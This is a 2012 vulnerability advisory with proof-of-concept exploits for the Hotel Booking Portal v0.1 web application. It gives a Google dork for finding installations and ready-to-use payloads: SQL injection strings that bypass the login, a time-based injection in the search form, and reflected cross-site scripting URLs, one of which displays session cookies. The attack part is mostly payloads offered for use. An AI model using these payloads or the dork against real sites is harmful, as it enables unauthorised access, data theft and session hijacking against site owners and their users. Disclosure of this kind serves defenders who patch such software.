#              _____ _ _            _      _
#             / ____(_) |          | |    | |
#            | |     _| |_ __ _  __| | ___| |
#            | |    | | __/ _` |/ _` |/ _ \ |
#            | |____| | || (_| | (_| |  __/ |
#             \_____|_|\__\__,_|\__,_|\___|_|
#            
# -----------------------------------------------------------
# Hotel Booking Portal v0.1 Multiple Vulnerabilities
# Google dork: "Made And Powered By Hotels Portal"
# Bug discovered by Yakir Wizman, <yakir.wizman@gmail.com>
# Date 09/08/2012
# Download - http://sourceforge.net/projects/hbportal/
# ISRAEL
# -----------------------------------------------------------
#       Author will be not responsible for any damage.
# -----------------------------------------------------------
# I. DESCRIPTION
# -----------------------------------------------------------
# 1). A vulnerability exists in &#039;login.php&#039; - Allows for &#039;SQL injection&#039; of the &#039;email&#039; and &#039;password&#039; POST parameters.
# 2). A vulnerability exists in &#039;searchresults.php&#039; - Allows for &#039;SQL injection&#039; of the &#039;country&#039; POST parameter.
# 3). A vulnerability exists in &#039;includes/languagebar.php&#039; - Allows for &#039;Cross site scripting&#039; of the &#039;window.location&#039; js
# 4). A vulnerability exists in &#039;administrator/login.php&#039; - Allows for &#039;Cross site scripting&#039; of the &#039;window.location&#039; js
# 5). A vulnerability exists in &#039;index.php&#039; - Allows for &#039;Cross site scripting&#039; of the &#039;lang&#039; GET parameter.
#
# -----------------------------------------------------------
# II. PoC EXPLOIT
# -----------------------------------------------------------
# 1). POST a form to login.php with the value of:
# email set to      : &#039; or &#039;1&#039;=&#039;1
# password set to   : &#039; or &#039;1&#039;=&#039;1
# 2). POST to searchresults.php with the value of &#039;country&#039; set to Armenia&#039; and sleep(1)=&#039;
# 3). http://127.0.0.1/hbportal/includes/languagebar.php?xss=";</script><script>alert(1);</script><script>
# 4). http://127.0.0.1/hbportal/administrator/login.php?xss=";</script><script>alert(1);</script><script>
# 5). http://127.0.0.1/hbportal/index.php?lang=";</script><script>alert(document.cookie);</script><script>
# -----------------------------------------------------------



